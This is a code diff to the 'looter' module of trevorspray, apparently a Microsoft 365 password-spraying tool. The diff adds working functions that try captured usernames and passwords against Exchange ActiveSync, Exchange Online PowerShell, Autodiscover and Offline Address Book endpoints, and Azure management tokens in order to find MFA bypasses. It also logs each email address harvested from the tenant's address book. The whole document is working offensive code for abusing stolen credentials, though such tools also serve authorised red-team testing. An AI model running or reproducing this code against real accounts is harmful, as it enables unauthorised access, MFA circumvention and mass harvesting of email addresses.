@@ -1,5 +1,10 @@
+import re
 import logging
+import requests
 from .base import Looter
+from contextlib import suppress
+from requests.auth import HTTPBasicAuth
+from ..util import windows_user_agent,highlight_json
 
 
 log = logging.getLogger('trevorspray.looters.msol')
@@ -14,6 +19,10 @@ class MSOLLooter(Looter):
         self.test_smtp(username, password)
         self.test_pop(username, password)
         self.test_ews(username, password)
+        self.test_eas(username, password)
+        self.test_exo_pwsh(username, password)
+        self.test_autodiscover(username, password)
+        self.test_azure_management(username, password)
 
 
     def test_imap(self, username, password):
@@ -103,7 +112,7 @@ class MSOLLooter(Looter):
 
     def test_ews(self, username, password):
 
-        log.info(f'Testing EWS MFA bypass for {username} (https://outlook.office365.com/EWS/Exchange.asmx)')
+        log.info(f'Testing Exchange Web Services (EWS) MFA bypass for {username} (https://outlook.office365.com/EWS/Exchange.asmx)')
         import poplib
         import string
         import datetime
@@ -126,6 +135,7 @@ class MSOLLooter(Looter):
                 with open(str(filename), "a") as f:
                     for i in list(string.ascii_lowercase):
                         for mailbox, contact in account.protocol.resolve_names([i], return_full_contact_data=True):
+                            log.success(f'Email looted: {mailbox.email_address}')
                             f.write(mailbox.email_address + "\n")
                             contacts_retrieved += 1
 
@@ -145,3 +155,164 @@ class MSOLLooter(Looter):
         finally:
             if contacts_retrieved > 0:
                 log.success(f'Successfully wrote {contacts_retrieved:,} emails to {filename}')
+
+
+    def test_eas(self, username, password):
+
+        success = False
+        log.info(f'Testing Exchange ActiveSync (EAS) MFA bypass for {username}')
+
+        response = None
+        with suppress(Exception):
+            response = requests.options(
+                'https://outlook.office365.com/Microsoft-Server-ActiveSync',
+                headers = {
+                    'User-Agent': windows_user_agent
+                },
+                auth=HTTPBasicAuth(username, password)
+            )
+            response_headers = dict(getattr(response, 'headers', {}))
+
+        if getattr(response, 'status_code', 0) == 200:
+            log.success(f'MFA bypass (Exchange ActiveSync) enabled for {username}!')
+            success = True
+
+        if success and response_headers:
+            log.success(highlight_json(response_headers))
+
+        return success
+
+
+    def test_exo_pwsh(self, username, password):
+
+        success = False
+        log.info(f'Testing Exchange Online Powershell (EXO) MFA bypass for {username}')
+
+        response = None
+        with suppress(Exception):
+            response = requests.options(
+                'https://outlook.office365.com/powershell-liveid/',
+                headers = {
+                    'User-Agent': windows_user_agent
+                },
+                auth=HTTPBasicAuth(username, password)
+            )
+            response_headers = dict(getattr(response, 'headers', {}))
+
+        if getattr(response, 'status_code', 0) == 200:
+            log.success(f'MFA bypass (Exchange Online Powershell) enabled for {username}!')
+            success = True
+
+        if success and response_headers:
+            log.success(highlight_json(response_headers))
+
+        return success
+
+
+    def test_autodiscover(self, username, password):
+
+        success = False
+        log.info(f'Testing Autodiscover MFA bypass for {username}')
+
+        response = None
+        with suppress(Exception):
+            response = requests.get(
+                'https://outlook.office365.com/autodiscover/autodiscover.xml',
+                headers = {
+                    'User-Agent': windows_user_agent,
+                    'Content-Type': 'text/xml'
+                },
+                auth=HTTPBasicAuth(username, password),
+                data=f'<?xml version="1.0" encoding="utf-8"?><Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006"><Request><EMailAddress>{username}</EMailAddress><AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema></Request></Autodiscover>',
+                verify=False
+            )
+            response_headers = dict(getattr(response, 'headers', {}))
+
+            log.info(f'Testing Offline Address Book (OAB) MFA bypass for {username}')
+            try:
+                found = re.search('<OABUrl>(http.*)</OABUrl>', response.text)
+
+                if found:
+                    log.success(f'Found OAB URL for {username}: {found.group(1)}')
+                    oab_url = found.group(1)
+
+                    oab_response = requests.get(
+                        f'{oab_url}/oab.xml',
+                        headers = {
+                            'User-Agent': windows_user_agent,
+                            'Content-Type': 'text/xml'
+                        },
+                        auth=HTTPBasicAuth(username, password),
+                        verify=False
+                    )
+                    found = re.search(r'>(.+lzx)<', oab_response.text)
+
+                    if found:
+                        log.success(f'Found LZX link for {username}: {found.group(1)}')
+                    else:
+                        log.warning(f'No LZX link found for {username}')
+
+                else:
+                    log.warn(f'No OAB URL found for {username}.')
+
+            except Exception as e:
+                if log.level <= logging.DEBUG:
+                    import traceback
+                    log.error(traceback.format_exc())
+                else:
+                    log.error(f'Encountered error while checking for OAB (-v to debug): {e}')
+
+        if getattr(response, 'status_code', 0) == 200:
+            log.success(f'MFA bypass (Autodiscover) enabled for {username}!')
+            success = True
+
+        if success and response_headers:
+            log.success(highlight_json(response_headers))
+
+        return success
+
+
+    def test_azure_management(self, username, password):
+
+        from ..sprayers.msol import MSOL
+
+        success = False
+        log.info(f'Testing Azure management for {username}')
+
+        request_data = {
+            'username': username,
+            'password': password,
+            'resource': 'https://management.core.windows.net',
+            'client_id': '38aa3b87-a06d-4817-b275-7a316988d93b',
+            'client_info': '1',
+            'grant_type': 'password',
+            'scope': 'openid',
+        }
+
+        headers = {
+            'Accept': 'application/json',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'User-Agent': 'Windows-AzureAD-Authentication-Provider/1.0',
+        }
+
+        with suppress(Exception):
+            response = requests.get(
+                'https://login.microsoftonline.com/common/oauth2/token',
+                headers=headers,
+                data=request_data,
+                verify=False
+            )
+
+            valid, exists, locked, msg = MSOL.check_response(None, response)
+            if valid:
+                log.success(f'{username} can authenticate to the Azure Service Management API - {msg}')
+            else:
+                log.warning(f'{username} cannot authenticate to the Azure Service Management API - {msg}')
+
+            if getattr(response, 'status_code', 0) == 200:
+                log.success(f'MFA Bypass! Azure management enabled for {username}! The "az" PowerShell module should work here.')
+                success = True
+            else:
+                log.warn(f'Azure management not enabled for {username}.')
+
+        return success
